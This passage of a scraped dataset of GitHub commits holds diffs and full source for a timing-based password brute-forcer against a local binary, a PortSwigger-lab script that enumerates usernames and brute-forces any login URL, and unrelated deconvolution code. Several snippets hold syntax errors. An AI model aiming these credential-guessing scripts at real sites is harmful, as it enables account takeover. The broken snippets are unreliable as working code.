brute_force.py"},"99098c46e63e173a87cdce5e030cbfb0351ad899":{"url":"https:\/\/api.github.com\/repos\/mattmetcalf059\/BruteForceMetcalf\/commits\/99098c46e63e173a87cdce5e030cbfb0351ad899","html_url":"https:\/\/github.com\/mattmetcalf059\/BruteForceMetcalf\/commit\/99098c46e63e173a87cdce5e030cbfb0351ad899","sha":"99098c46e63e173a87cdce5e030cbfb0351ad899","keyword":"brute force update","diff":"diff --git a\/brute_force.py b\/brute_force.py\nindex c187692..e945d7d 100644\n--- a\/brute_force.py\n+++ b\/brute_force.py\n@@ -23,4 +23,4 @@ def check_password(password):\n \n     result, time_taken = check_password(password)\n     if result == 'Success':\n-        print(f'Password found: {password}\n+        print('Password found: {password}\n","message":"","files":{"\/brute_force.py":{"changes":[{"diff":"\n \n     result, time_taken = check_password(password)\n     if result == 'Success':\n-        print(f'Password found: {password}\n+        print('Password found: {password}\n","add":1,"remove":1,"filename":"\/brute_force.py","badparts":["        print(f'Password found: {password}"],"goodparts":["        print('Password found: {password}"]}],"source":"\nimport time import subprocess charset='abcdefghijklmnopqrstuvwxyz' password_length=8 def check_password(password): start_time=time.time() result=subprocess.run(['.\/vault.o', password], stdout=subprocess.PIPE, stderr=subprocess.PIPE) end_time=time.time() time_taken=end_time -start_time return(result.stdout.decode().strip(), time_taken) for i in range(26 ** password_length): password='' temp=i for j in range(password_length): password=charset[temp % 26] +password temp \/\/=26 result, time_taken=check_password(password) if result=='Success': print(f'Password found:{password} ","sourceWithComments":"import time\nimport subprocess\n\n# Character set for password generation\ncharset = 'abcdefghijklmnopqrstuvwxyz'\npassword_length = 8 # Assumed password length\n\n# Function to calculate the time taken for password verification\ndef check_password(password):\n    start_time = time.time()\n    result = subprocess.run(['.\/vault.o', password], stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    end_time = time.time()\n    time_taken = end_time - start_time\n    return (result.stdout.decode().strip(), time_taken)\n\n# Brute-force attack\nfor i in range(26 ** password_length):\n    password = ''\n    temp = i\n    for j in range(password_length):\n        password = charset[temp % 26] + password\n        temp \/\/= 26\n\n    result, time_taken = check_password(password)\n    if result == 'Success':\n        print(f'Password found: {password}\n"}},"msg":"Update brute_force.py"},"302f9c33133c1f6cc55096e894910b7a4a5af94a":{"url":"https:\/\/api.github.com\/repos\/mattmetcalf059\/BruteForceMetcalf\/commits\/302f9c33133c1f6cc55096e894910b7a4a5af94a","html_url":"https:\/\/github.com\/mattmetcalf059\/BruteForceMetcalf\/commit\/302f9c33133c1f6cc55096e894910b7a4a5af94a","sha":"302f9c33133c1f6cc55096e894910b7a4a5af94a","keyword":"brute force update","diff":"diff --git a\/brute_force.py b\/brute_force.py\nindex e945d7d..bfa448c 100644\n--- a\/brute_force.py\n+++ b\/brute_force.py\n@@ -22,5 +22,6 @@ def check_password(password):\n         temp \/\/= 26\n \n     result, time_taken = check_password(password)\n-    if result == 'Success':\n-        print('Password found: {password}\n+    if result == \"Success\":\n+        print(f\"Password found: {password}\")\n+        break\n","message":"","files":{"\/brute_force.py":{"changes":[{"diff":"\n         temp \/\/= 26\n \n     result, time_taken = check_password(password)\n-    if result == 'Success':\n-        print('Password found: {password}\n+    if result == \"Success\":\n+        print(f\"Password found: {password}\")\n+        break\n","add":3,"remove":2,"filename":"\/brute_force.py","badparts":["    if result == 'Success':","        print('Password found: {password}"],"goodparts":["    if result == \"Success\":","        print(f\"Password found: {password}\")","        break"]}],"source":"\nimport time import subprocess charset='abcdefghijklmnopqrstuvwxyz' password_length=8 def check_password(password): start_time=time.time() result=subprocess.run(['.\/vault.o', password], stdout=subprocess.PIPE, stderr=subprocess.PIPE) end_time=time.time() time_taken=end_time -start_time return(result.stdout.decode().strip(), time_taken) for i in range(26 ** password_length): password='' temp=i for j in range(password_length): password=charset[temp % 26] +password temp \/\/=26 result, time_taken=check_password(password) if result=='Success': print('Password found:{password} ","sourceWithComments":"import time\nimport subprocess\n\n# Character set for password generation\ncharset = 'abcdefghijklmnopqrstuvwxyz'\npassword_length = 8 # Assumed password length\n\n# Function to calculate the time taken for password verification\ndef check_password(password):\n    start_time = time.time()\n    result = subprocess.run(['.\/vault.o', password], stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    end_time = time.time()\n    time_taken = end_time - start_time\n    return (result.stdout.decode().strip(), time_taken)\n\n# Brute-force attack\nfor i in range(26 ** password_length):\n    password = ''\n    temp = i\n    for j in range(password_length):\n        password = charset[temp % 26] + password\n        temp \/\/= 26\n\n    result, time_taken = check_password(password)\n    if result == 'Success':\n        print('Password found: {password}\n"}},"msg":"Update brute_force.py"}},"https:\/\/github.com\/Ch2ico\/BurpSuite-Lab":{"6a4ca8c4a0f58fb7d2243eaaf10b227429424468":{"url":"https:\/\/api.github.com\/repos\/Ch2ico\/BurpSuite-Lab\/commits\/6a4ca8c4a0f58fb7d2243eaaf10b227429424468","html_url":"https:\/\/github.com\/Ch2ico\/BurpSuite-Lab\/commit\/6a4ca8c4a0f58fb7d2243eaaf10b227429424468","message":"Update Brute_force.py","sha":"6a4ca8c4a0f58fb7d2243eaaf10b227429424468","keyword":"brute force update","diff":"diff --git a\/Authentication_vulnerabilities\/Lab_01\/Brute_force.py b\/Authentication_vulnerabilities\/Lab_01\/Brute_force.py\nindex ac0f8d1..a911bbe 100644\n--- a\/Authentication_vulnerabilities\/Lab_01\/Brute_force.py\n+++ b\/Authentication_vulnerabilities\/Lab_01\/Brute_force.py\n@@ -60,7 +60,6 @@ def cred_steal(url):\n                 print(\"[+] Valid password %s \" % j)\n \n \n-\n def main():\n     if len(sys.argv) != 2:\n         print(\"[+] Usage: %s <url> \" % sys.argv[0])\n@@ -72,4 +71,4 @@ def main():\n \n \n if __name__==\"__main__\":\n-    main()\n\\ No newline at end of file\n+    main()\n","files":{"\/Authentication_vulnerabilities\/Lab_01\/Brute_force.py":{"changes":[{"diff":"\n \n \n if __name__==\"__main__\":\n-    main()\n\\ No newline at end of file\n+    main()\n","add":1,"remove":1,"filename":"\/Authentication_vulnerabilities\/Lab_01\/Brute_force.py","badparts":["    main()"],"goodparts":["    main()"]}],"source":"\nimport requests import sys import urllib3 from bs4 import BeautifulSoup urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) proxy={'http':'http:\/\/127.0.0.1:8080', 'https': 'http:\/\/127.0.0.1:8080'} def scrap_username(): url=\"https:\/\/portswigger.net\/web-security\/authentication\/auth-lab-usernames\" r=requests.get(url, verify=False, proxies=proxy) res=r.text soup=BeautifulSoup(res, 'html.parser') for word in soup.code.contents: word=word.split('\\n') username_list=word return username_list def scrap_password(): url='https:\/\/portswigger.net\/web-security\/authentication\/auth-lab-passwords' r=requests.get(url, verify=False, proxies=proxy) res=r.text soup=BeautifulSoup(res, 'html.parser') for word in soup.code.contents: word=word.split('\\n') password_list=word return password_list def enum_username(url): username_list=scrap_username() print(\"[+] Looking for valid username\") for i in username_list: creds={ 'username': i, 'password': 'lol' } r=requests.post(url, verify=False, proxies=proxy, data=creds) res=r.text if 'Incorrect password' in res: print(i) valid_username=[] valid_username.append(i) return valid_username def cred_steal(url): password_list=scrap_password() valid_username=enum_username(url) print(\"[+] Looking for valid password\") for i in valid_username: for j in password_list: creds={ 'username': i, 'password': jIncorrect password' } r=requests.post(url, verify=False, proxies=proxy, data=creds) res=r.text if 'Incorrect password' not in res: print(\"[+] Valid username %s\" % i) print(\"[+] Valid password %s \" % j) def main(): if len(sys.argv) !=2: print(\"[+] Usage: %s <url> \" % sys.argv[0]) print(\"[+] Example: %s www.example.com \" % sys.argv[0]) sys.exit(-1) url=sys.argv[1].strip() print(\"[+] Brute forcing the shit out of the website...\") cred_steal(url) if __name__==\"__main__\": main() ","sourceWithComments":"import requests\nimport sys\nimport urllib3\nfrom bs4 import BeautifulSoup\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n\nproxy = {'http':'http:\/\/127.0.0.1:8080', 'https': 'http:\/\/127.0.0.1:8080'}\n\ndef scrap_username():\n    url = \"https:\/\/portswigger.net\/web-security\/authentication\/auth-lab-usernames\"\n    r = requests.get(url, verify=False, proxies=proxy)\n    res = r.text\n    soup = BeautifulSoup(res, 'html.parser')\n    for word in soup.code.contents:\n        word = word.split('\\n')\n        username_list = word\n    return username_list\n\ndef scrap_password():\n    url = 'https:\/\/portswigger.net\/web-security\/authentication\/auth-lab-passwords'\n    r = requests.get(url, verify=False, proxies=proxy)\n    res = r.text\n    soup = BeautifulSoup (res, 'html.parser')\n    for word in soup.code.contents:\n        word = word.split('\\n')\n        password_list = word\n    return password_list\n\n\ndef enum_username(url):\n    username_list= scrap_username()\n    print(\"[+] Looking for valid username\")\n    for i in username_list:\n        creds = {\n        'username': i,\n        'password': 'lol'\n        }\n        r = requests.post(url, verify= False, proxies=proxy, data=creds)\n        res = r.text\n        if 'Incorrect password' in res:\n            print(i)\n            valid_username= []\n            valid_username.append(i)\n            return valid_username\n\ndef cred_steal(url):\n    password_list = scrap_password()\n    valid_username = enum_username(url)\n    print(\"[+] Looking for valid password\")\n    for i in valid_username:\n        for j in password_list:\n            creds = {\n                'username': i,\n                'password': jIncorrect password'\n            }\n            r = requests.post(url, verify=False, proxies=proxy, data=creds)\n            res = r.text\n            if 'Incorrect password' not in res:\n                print(\"[+] Valid username %s\" % i)\n                print(\"[+] Valid password %s \" % j)\n\n\n\ndef main():\n    if len(sys.argv) != 2:\n        print(\"[+] Usage: %s <url> \" % sys.argv[0])\n        print(\"[+] Example: %s www.example.com \" % sys.argv[0])\n        sys.exit(-1)\n    url = sys.argv[1].strip()\n    print(\"[+] Brute forcing the shit out of the website...\")\n    cred_steal(url)\n\n\nif __name__==\"__main__\":\n    main()"}},"msg":"Update Brute_force.py"}},"https:\/\/github.com\/RobertAJCoates\/Deconvolution-of-data-22":{"52833e8aad56d4c052869d70823115fb438a3a2b":{"url":"https:\/\/api.github.com\/repos\/RobertAJCoates\/Deconvolution-of-data-22\/commits\/52833e8aad56d4c052869d70823115fb438a3a2b","html_url":"https:\/\/github.com\/RobertAJCoates\/Deconvolution-of-data-22\/commit\/52833e8aad56d4c052869d70823115fb438a3a2b","sha":"52833e8aad56d4c052869d70823115fb438a3a2b","keyword":"brute force update","diff":"diff --git a\/pybruteforce\/stepfn.py b\/pybruteforce\/stepfn.py\nindex 2557936..fa77a79 100644\n--- a\/pybruteforce\/stepfn.py\n+++ b\/pybruteforce\/stepfn.py\n@@ -6,17 +6,21 @@\n for i in np.arange(3,13,1):\n     y[i] = 2\n #calculate convolution of step fn (F is fourier) \n-t_fftfreq = np.fft.fftfreq(n,d = 1x.size)\n+t_fftfreq = np.fft.fftfreq(n,d = 1\/x.size)\n x_fft = np.fft.fft(x)\n t_fft = x_fft * t_fftfreq#--->g(t)\n y_fft = np.fft.fft(y)#--->f(x)\n-ytfft = y_fft * t_fft #---> F(f*g) = Ff * Fg ---->convolution \n+ytfft = y_fft * x_fft #---> F(f*g) = Ff * Fg ---->convolution \n Fyt = np.fft.ifftshift(np.round(np.real(ytfft)))#--->ifftshift [inverse fftshift]: shifts zero freq component 2 centre of spectrum\n+\n #add guassian noise\n \n+#brute force deconvolute - use for, while or if loops to save time but probably not that much time in reality\n+\n #plot graphs (stepfn, convoluted stepfn, convoluted stepfn with gaussain)\n-figs,axs = plt.subplots(1,2)\n-axs[1].step(x,y)\n+figs,axs = plt.subplots(2,2)\n+axs[0,0].step(x,y)\n axs[0,1].plot(Fyt)\n+\n plt.savefig('stepfntest.png')\n plt.show()\n\\ No newline at end of file\ndiff --git a\/stepfntest.png b\/stepfntest.png\nindex 6c9fd59..2fb60b0 100644\nBinary files a\/stepfntest.png and b\/stepfntest.png differ\n","message":"","files":{"\/pybruteforce\/stepfn.py":{"changes":[{"diff":"\n for i in np.arange(3,13,1):\n     y[i] = 2\n #calculate convolution of step fn (F is fourier) \n-t_fftfreq = np.fft.fftfreq(n,d = 1x.size)\n+t_fftfreq = np.fft.fftfreq(n,d = 1\/x.size)\n x_fft = np.fft.fft(x)\n t_fft = x_fft * t_fftfreq#--->g(t)\n y_fft = np.fft.fft(y)#--->f(x)\n-ytfft = y_fft * t_fft #---> F(f*g) = Ff * Fg ---->convolution \n+ytfft = y_fft * x_fft #---> F(f*g) = Ff * Fg ---->convolution \n Fyt = np.fft.ifftshift(np.round(np.real(ytfft)))#--->ifftshift [inverse fftshift]: shifts zero freq component 2 centre of spectrum\n+\n #add guassian noise\n \n+#brute force deconvolute - use for, while or if loops to save time but probably not that much time in reality\n+\n #plot graphs (stepfn, convoluted stepfn, convoluted stepfn with gaussain)\n-figs,axs = plt.subplots(1,2)\n-axs[1].step(x,y)\n+figs,axs = plt.subplots(2,2)\n+axs[0,0].step(x,y)\n axs[0,1].plot(Fyt)\n+\n plt.savefig('stepfntest.png')\n plt.show()\n\\ No newline at end of file","add":8,"remove":4,"filename":"\/pybruteforce\/stepfn.py","badparts":["t_fftfreq = np.fft.fftfreq(n,d = 1x.size)","ytfft = y_fft * t_fft #---> F(f*g) = Ff * Fg ---->convolution ","figs,axs = plt.subplots(1,2)","axs[1].step(x,y)"],"goodparts":["t_fftfreq = np.fft.fftfreq(n,d = 1\/x.size)","ytfft = y_fft * x_fft #---> F(f*g) = Ff * Fg ---->convolution ","figs,axs = plt.subplots(2,2)","axs[0,0].step(x,y)"]}],"source":"\nimport numpy as np, matplotlib.pyplot as plt n=16 x=np.arange(0,n,1) y=np.zeros(n) for i in np.arange(3,13,1): y[i]=2 t_fftfreq=np.fft.fftfreq(n,d=1x.size) x_fft=np.fft.fft(x) t_fft=x_fft * t_fftfreq y_fft=np.fft.fft(y) ytfft=y_fft * t_fft Fyt=np.fft.ifftshift(np.round(np.real(ytfft))) figs,axs=plt.subplots(1,2) axs[1].step(x,y) axs[0,1].plot(Fyt) plt.savefig('stepfntest.png') plt.show() ","sourceWithComments":"import numpy as np, matplotlib.pyplot as plt\n#test fn: step fn; create fn using np arrays\nn=16\nx = np.arange(0,n,1)\ny =np.zeros(n)\nfor i in np.arange(3,13,1):\n    y[i] = 2\n#calculate convolution of step fn (F is fourier) \nt_fftfreq = np.fft.fftfreq(n,d = 1x.size)\nx_fft = np.fft.fft(x)\nt_fft = x_fft * t_fftfreq#--->g(t)\ny_fft = np.fft.fft(y)#--->f(x)\nytfft = y_fft * t_fft #---> F(f*g) = Ff * Fg ---->convolution \nFyt = np.fft.ifftshift(np.round(np.real(ytfft)))#--->ifftshift [inverse fftshift]: shifts zero freq component 2 centre of spectrum\n#add guassian noise\n\n#plot graphs (stepfn, convoluted stepfn, convoluted stepfn with gaussain)\nfigs,axs = plt.subplots(1,2)\naxs[1].step(x,y)\naxs[0,1].plot(Fyt)\nplt.savefig('stepfntest.png')\nplt.show()"}},"msg":"brute force .py update"},"de9f5cd3c390ebab1fdf024662f4d4492556cb08":{"url":"https:\/\/api.github.com\/repos\/RobertAJCoates\/Deconvolution-of-data-22\/commits\/de9f5cd3c390ebab1fdf024662f4d4492556cb08","html_url":"https:\/\/github.com\/RobertAJCoates\/Deconvolution-of-data-22\/commit\/de9f5cd3c390ebab1fdf024662f4d4492556cb08","sha":"de9f5cd3c390ebab1fdf024662f4d4492556cb08","keyword":"brute force update","diff":"diff --git a\/pybruteforce\/stepfn.py b\/pybruteforce\/stepfn.py\nindex fa77a79..04e0d53 100644\n--- a\/pybruteforce\/stepfn.py\n+++ b\/pybruteforce\/stepfn.py\n@@ -1,4 +1,5 @@\n import numpy as np, matplotlib.pyplot as plt\n+from cmath import exp,pi\n #test fn: step fn; create fn using np arrays\n n=16\n x = np.arange(0,n,1)\n@@ -6,11 +7,12 @@\n for i in np.arange(3,13,1):\n     y[i] = 2\n #calculate convolution of step fn (F is fourier) \n-t_fftfreq = np.fft.fftfreq(n,d = 1\/x.size)\n+#t[0] = exp(-2*pi*x[1]),....t[n]= exp(-2*pi*x[n]) \n+# print(t)\n x_fft = np.fft.fft(x)\n-t_fft = x_fft * t_fftfreq#--->g(t)\n+t_fft = x_fft * exp(-2*pi)\n y_fft = np.fft.fft(y)#--->f(x)\n-ytfft = y_fft * x_fft #---> F(f*g) = Ff * Fg ---->convolution \n+ytfft = y_fft * t_fft #---> F(f*g) = Ff * Fg ---->convolution \n Fyt = np.fft.ifftshift(np.round(np.real(ytfft)))#--->ifftshift [inverse fftshift]: shifts zero freq component 2 centre of spectrum\n \n #add guassian noise\ndiff --git a\/pybruteforce\/stepfntest.png b\/pybruteforce\/stepfntest.png\nnew file mode 100644\nindex 0000000..2fb60b0\nBinary files \/dev\/null and b\/pybruteforce\/stepfntest.png differ\ndiff --git a\/stepfntest.png b\/stepfntest.png\nindex 2fb60b0..d22d7a5 100644\nBinary files a\/stepfntest.png and b\/stepfntest.png differ\n","message":"","files":{"\/pybruteforce\/stepfn.py":{"changes":[{"diff":" for i in np.arange(3,13,1):\n     y[i] = 2\n #calculate convolution of step fn (F is fourier) \n-t_fftfreq = np.fft.fftfreq(n,d = 1\/x.size)\n+#t[0] = exp(-2*pi*x[1]),....t[n]= exp(-2*pi*x[n]) \n+# print(t)\n x_fft = np.fft.fft(x)\n-t_fft = x_fft * t_fftfreq#--->g(t)\n+t_fft = x_fft * exp(-2*pi)\n y_fft = np.fft.fft(y)#--->f(x)\n-ytfft = y_fft * x_fft #---> F(f*g) = Ff * Fg ---->convolution \n+ytfft = y_fft * t_fft #---> F(f*g) = Ff * Fg ---->convolution \n Fyt = np.fft.ifftshift(np.round(np.real(ytfft)))#--->ifftshift [inverse fftshift]: shifts zero freq component 2 centre of spectrum\n \n #add guassian noise","add":4,"remove":3,"filename":"\/pybruteforce\/stepfn.py","badparts":["t_fftfreq = np.fft.fftfreq(n,d = 1\/x.size)","t_fft = x_fft * t_fftfreq#--->g(t)","ytfft = y_fft * x_fft #---> F(f*g) = Ff * Fg ---->convolution "],"goodparts":["t_fft = x_fft * exp(-2*pi)","ytfft = y_fft * t_fft #---> F(f*g) = Ff * Fg ---->convolution "]}],"source":"\nimport numpy as np, matplotlib.pyplot as plt n=16 x=np.arange(0,n,1) y=np.zeros(n) for i in np.arange(3,13,1): y[i]=2 t_fftfreq=np.fft.fftfreq(n,d=1\/x.size) x_fft=np.fft.fft(x) t_fft=x_fft * t_fftfreq y_fft=np.fft.fft(y) ytfft=y_fft * x_fft Fyt=np.fft.ifftshift(np.round(np.real(ytfft))) figs,axs=plt.subplots(2,2) axs[0,0].step(x,y) axs[0,1].plot(Fyt) plt.savefig('stepfntest.png') plt.show() ","sourceWithComments":"import numpy as np, matplotlib.pyplot as plt\n#test fn: step fn; create fn using np arrays\nn=16\nx = np.arange(0,n,1)\ny =np.zeros(n)\nfor i in np.arange(3,13,1):\n    y[i] = 2\n#calculate convolution of step fn (F is fourier) \nt_fftfreq = np.fft.fftfreq(n,d = 1\/x.size)\nx_fft = np.fft.fft(x)\nt_fft = x_fft * t_fftfreq#--->g(t)\ny_fft = np.fft.fft(y)#--->f(x)\nytfft = y_fft * x_fft #---> F(f*g) = Ff * Fg ---->convolution \nFyt = np.fft.ifftshift(np.round(np.real(ytfft)))#--->ifftshift [inverse fftshift]: shifts zero freq component 2 centre of spectrum\n\n#add guassian noise\n\n#brute force deconvolute - use for, while or if loops to save time but probably not that much time in reality\n\n#plot graphs (stepfn, convoluted stepfn, convoluted stepfn with gaussain)\nfigs,axs = plt.subplots(2,2)\naxs[0,0].step(x,y)\naxs[0,1].plot(Fyt)\n\nplt.savefig('stepfntest.png')\nplt.show()"}},"msg":".py brute force update"},"ef5494b9000144dbd04e2c5ff5f8ac5e8aa379a6":{"url":"https:\/\/api.github.com\/repos\/RobertAJCoates\/Deconvolution-of-data-22\/commits\/ef5494b9000144dbd04e2c5ff5f8ac5e8aa379a6","html_url":"https:\/\/github.com\/RobertAJCoates\/Deconvolution-of-data-22\/commit\/ef5494b9000144dbd04e2c5ff5f8ac5e8aa379a6","sha":"ef5494b9000144dbd04e2c5ff5f8ac5e8aa379a6","keyword":"brute force update","diff":"diff --git a\/pybruteforce\/__pycache__\/convolution.cpython-39.pyc b\/pybruteforce\/__pycache__\/convolution.cpython-39.pyc\nindex 3e3ca2e..d4157e2 100644\nBinary files a\/pybruteforce\/__pycache__\/convolution.cpython-39.pyc and b\/pybruteforce\/__pycache__\/convolution.cpython-39.pyc differ\ndiff --git a\/pybruteforce\/__pycache__\/kernal.cpython-39.pyc b\/pybruteforce\/__pycache__\/kernal.cpython-39.pyc\nindex bb8d6d0..ede1c6f 100644\nBinary files a\/pybruteforce\/__pycache__\/kernal.cpython-39.pyc and b\/pybruteforce\/__pycache__\/kernal.cpython-39.pyc differ\ndiff --git a\/pybruteforce\/convolution.py b\/pybruteforce\/convolution.py\nindex e1797f6..66aaed6 100644\n--- a\/pybruteforce\/convolution.py\n+++ b\/pybruteforce\/convolution.py\n@@ -1,6 +1,6 @@\n import numpy as np, scipy as sc\n #define covolution step for any test function y = f(x) and kernal function u= g(t)\n def discreteFourierconvol(y,u):\n-    return np.fft.fft(u(y))\n+    return np.fft.fft(y)*np.fft.fft(u)\n def continuousFourierconvol(y,u):\n     return sc.signal.convolve(y,u)\n\\ No newline at end of file\ndiff --git a\/pybruteforce\/guassiannoise.py b\/pybruteforce\/guassiannoise.py\nnew file mode 100644\nindex 0000000..a22b22b\n--- \/dev\/null\n+++ b\/pybruteforce\/guassiannoise.py\n@@ -0,0 +1 @@\n+import numpy as np\ndiff --git a\/pybruteforce\/kernal.py b\/pybruteforce\/kernal.py\nindex eaedf6c..49a139b 100644\n--- a\/pybruteforce\/kernal.py\n+++ b\/pybruteforce\/kernal.py\n@@ -3,7 +3,8 @@\n from testfn import n1\n freq = np.pi\/n1\n def g1(t):\n-    return np.sin(t) \n-t = np.arange(0, n1*np.pi, freq)\n-u1 = np.sin(t)\n-print(u1.size, t.size)\n+    return (np.cos(t))**2\n+a = freq * (n1\/2)\n+b = a + freq\n+t = np.arange(-a,a,freq\/200)\n+u1 = g1(t)\n\\ No newline at end of file\ndiff --git a\/pybruteforce\/stepfnbf.py b\/pybruteforce\/stepfnbf.py\ndeleted file mode 100644\nindex a0b1cc5..0000000\n--- a\/pybruteforce\/stepfnbf.py\n+++ \/dev\/null\n@@ -1,10 +0,0 @@\n-import numpy as np, matplotlib.pyplot as plt, scipy as sc\n-from testfn import xstepfn,ystepfn\n-from kernal import t,u1\n-from convolution import continuousFourierconvol\n-stepfn = [xstepfn,ystepfn]\n-print(stepfn)\n-print(xstepfn.size,ystepfn.size)\n-#convolutestepfn\n-convol_stepfn = continuousFourierconvol(ystepfn,u1)\n-print(convol_stepfn)\ndiff --git a\/pybruteforce\/stepfnconvolnoise.py b\/pybruteforce\/stepfnconvolnoise.py\nnew file mode 100644\nindex 0000000..8cd7d6b\n--- \/dev\/null\n+++ b\/pybruteforce\/stepfnconvolnoise.py\n@@ -0,0 +1,18 @@\n+import numpy as np, matplotlib.pyplot as plt, scipy as sc\n+from testfn import xstepfn,ystepfn\n+from kernal import t,u1\n+from convolution import continuousFourierconvol, discreteFourierconvol\n+stepfn = (xstepfn,ystepfn)\n+print(xstepfn.size,ystepfn.size,t,u1)\n+#convolutestepfn\n+convol_stepfn = continuousFourierconvol(ystepfn,u1)#--->contFourier used cos g1(t) is a cont. fn\n+#add guass noise\n+convol_stepfn_plusnoise = ()\n+#plot graphs\n+figs,axs =plt.subplots(2,2)\n+axs[0,0].step(xstepfn,ystepfn)\n+axs[0,0].plot(t,u1)\n+axs[0,1].plot(convol_stepfn)\n+axs[1,1].plot(convol_stepfn_plusnoise)\n+plt.savefig(\"stepfnbconvol.png\")\n+plt.show()\n\\ No newline at end of file\ndiff --git a\/pybruteforce\/stepfndeconvo.py b\/pybruteforce\/stepfndeconvo.py\nnew file mode 100644\nindex 0000000..03dd63a\n--- \/dev\/null\n+++ b\/pybruteforce\/stepfndeconvo.py\n@@ -0,0 +1,3 @@\n+import numpy as np, matplotlib.pyplot as plt, scipy as sc\n+#brute force deconvolution method\n+#np.ifft method\ndiff --git a\/stepfnbconvol.png b\/stepfnbconvol.png\nnew file mode 100644\nindex 0000000..3331e28\nBinary files \/dev\/null and b\/stepfnbconvol.png differ\n","message":"","files":{"\/pybruteforce\/convolution.py":{"changes":[{"diff":"\n import numpy as np, scipy as sc\n #define covolution step for any test function y = f(x) and kernal function u= g(t)\n def discreteFourierconvol(y,u):\n-    return np.fft.fft(u(y))\n+    return np.fft.fft(y)*np.fft.fft(u)\n def continuousFourierconvol(y,u):\n     return sc.signal.convolve(y,u)\n\\ No newline at end of fi","add":1,"remove":1,"filename":"\/pybruteforce\/convolution.py","badparts":["    return np.fft.fft(u(y))"],"goodparts":["    return np.fft.fft(y)*np.fft.fft(u)"]}],"source":"\nimport numpy as np, scipy as sc def discreteFourierconvol(y,u): return np.fft.fft(u(y)) def continuousFourierconvol(y,u): return sc.signal.convolve(y,u) ","sourceWithComments":"import numpy as np, scipy as sc\n#define covolution step for any test function y = f(x) and kernal function u= g(t)\ndef discreteFourierconvol(y,u):\n    return np.fft.fft(u(y))\ndef continuousFourierconvol(y,u):\n    return sc.signal.convolve(y,u)"},"\/pybruteforce\/kernal.py":{"changes":[{"diff":"\n from testfn import n1\n freq = np.pi\/n1\n def g1(t):\n-    return np.sin(t) \n-t = np.arange(0, n1*np.pi, freq)\n-u1 = np.sin(t)\n-print(u1.size, t.size)\n+    return (np.cos(t))**2\n+a = freq * (n1\/2)\n+b = a + freq\n+t = np.arange(-a,a,freq\/200)\n+u1 = g1(t)\n\\ No newline at end of ","add":5,"remove":4,"filename":"\/pybruteforce\/kernal.py","badparts":["    return np.sin(t) ","t = np.arange(0, n1*np.pi, freq)","u1 = np.sin(t)","print(u1.size, t.size)"],"goodparts":["    return (np.cos(t))**2","a = freq * (n1\/2)","b = a + freq","t = np.arange(-a,a,freq\/200)","u1 = g1(t)"]}],"source":"\nimport numpy as np, matplotlib.pyplot as plt from testfn import n1 freq=np.pi\/n1 def g1(t): return np.sin(t) t=np.arange(0, n1*np.pi, freq) u1=np.sin(t) print(u1.size, t.size) ","sourceWithComments":"import numpy as np, matplotlib.pyplot as plt\n#Test 1 g(t) = sin(t)\nfrom testfn import n1\nfreq = np.pi\/n1\ndef g1(t):\n    return np.sin(t) \nt = np.arange(0, n1*np.pi, freq)\nu1 = np.sin(t)\nprint(u1.size, t.size)\n"},"\/pybruteforce\/stepfnbf.py":{"changes":[{"diff":"\n-import numpy as np, matplotlib.pyplot as plt, scipy as sc\n-from testfn import xstepfn,ystepfn\n-from kernal import t,u1\n-from convolution import continuousFourierconvol\n-stepfn = [xstepfn,ystepfn]\n-print(stepfn)\n-print(xstepfn.size,ystepfn.size)\n-#convolutestepfn\n-convol_stepfn = continuousFourierconvol(ystepfn,u1)\n-print(convol_st","add":0,"remove":10,"filename":"\/pybruteforce\/stepfnbf.py","badparts":["import numpy as np, matplotlib.pyplot as plt, scipy as sc","from testfn import xstepfn,ystepfn","from kernal import t,u1","from convolution import continuousFourierconvol","stepfn = [xstepfn,ystepfn]","print(stepfn)","print(xstepfn.size,ystepfn.size)","convol_stepfn = continuousFourierconvol(ystepfn,u1)","print(convol_st"],"goodparts":[]}],"source":"\nimport numpy as np, matplotlib.pyplot as plt, scipy as sc from testfn import xstepfn,ystepfn from kernal import t,u1 from convolution import continuousFourierconvol stepfn=[xstepfn,ystepfn] print(stepfn) print(xstepfn.size,ystepfn.size) convol_stepfn=continuousFourierconvol(ystepfn,u1) print(convol_stepfn) ","sourceWithComments":"import numpy as np, matplotlib.pyplot as plt, scipy as sc\nfrom testfn import xstepfn,ystepfn\nfrom kernal import t,u1\nfrom convolution import continuousFourierconvol\nstepfn = [xstepfn,ystepfn]\nprint(stepfn)\nprint(xstepfn.size,ystepfn.size)\n#convolutestepfn\nconvol_stepfn = continuousFourierconvol(ystepfn,u1)\nprint(convol_stepfn)\n"}},"msg":"brute force branch update"},"4d761ce6b59e7a3ccda7a0a6053f0502c064d31f":{"url":"https:\/\/api.github.com\/repos\/RobertAJCoates\/Deconvolution-of-data-22\/commits\/4d761ce6b59e7a3ccda7a0a6053f0502c064d31f","html_url":"https:\/\/github.com\/RobertAJCoates\/Deconvolution-of-data-22\/commit\/4d761ce6b59e7a3ccda7a0a6053f0502c064d31f","sha":"4d761ce6b59e7a3ccda7a0a6053f0502c064d31f","keyword":"brute force update","diff":"diff --git a\/pybruteforce\/__pycache__\/convolution.cpython-39.pyc b\/pybruteforce\/__pycache__\/convolution.cpython-39.pyc\ndeleted file mode 100644\nindex d4157e2..0000000\nBinary files a\/pybruteforce\/__pycache__\/convolution.cpython-39.pyc and \/dev\/null differ\ndiff --git a\/pybruteforce\/__pycache__\/kernal.cpython-39.pyc b\/pybruteforce\/__pycache__\/kernal.cpython-39.pyc\ndeleted file mode 100644\nindex ede1c6f..0000000\nBinary files a\/pybruteforce\/__pycache__\/kernal.cpython-39.pyc and \/dev\/null differ\ndiff --git a\/pybruteforce\/__pycache__\/stepfn.cpython-39.pyc b\/pybruteforce\/__pycache__\/stepfn.cpython-39.pyc\ndeleted file mode 100644\nindex 94fe038..0000000\nBinary files a\/pybruteforce\/__pycache__\/stepfn.cpython-39.pyc and \/dev\/null differ\ndiff --git a\/pybruteforce\/__pycache__\/testfn.cpython-39.pyc b\/pybruteforce\/__pycache__\/testfn.cpython-39.pyc\ndeleted file mode 100644\nindex 477c7ac..0000000\nBinary files a\/pybruteforce\/__pycache__\/testfn.cpython-39.pyc and \/dev\/null differ\ndiff --git a\/pybruteforce\/guassiannoise.py b\/pybruteforce\/guassiannoise.py\nindex a22b22b..2247c67 100644\n--- a\/pybruteforce\/guassiannoise.py\n+++ b\/pybruteforce\/guassiannoise.py\n@@ -1 +1 @@\n-import numpy as np\n+import numpy as np\n\\ 